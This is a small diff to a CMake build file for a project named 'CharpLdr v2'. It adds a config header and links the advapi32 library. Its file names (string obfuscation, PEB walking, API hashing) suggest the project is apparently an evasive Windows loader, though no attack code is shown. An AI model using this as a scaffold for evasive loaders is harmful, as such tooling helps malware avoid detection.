@@ -32,6 +32,7 @@ set(ASM_SOURCES
 
 # Header files (for IDE visibility)
 set(HEADERS
+    src/config.h
     src/hash.h
     src/obfstr.h
     src/peb_walk.h
@@ -84,6 +85,7 @@ target_link_libraries(charpldr PRIVATE
     oleaut32
     ole32
     ws2_32
+    advapi32
 )
 
 message(STATUS "CharpLdr v2 configuration:")
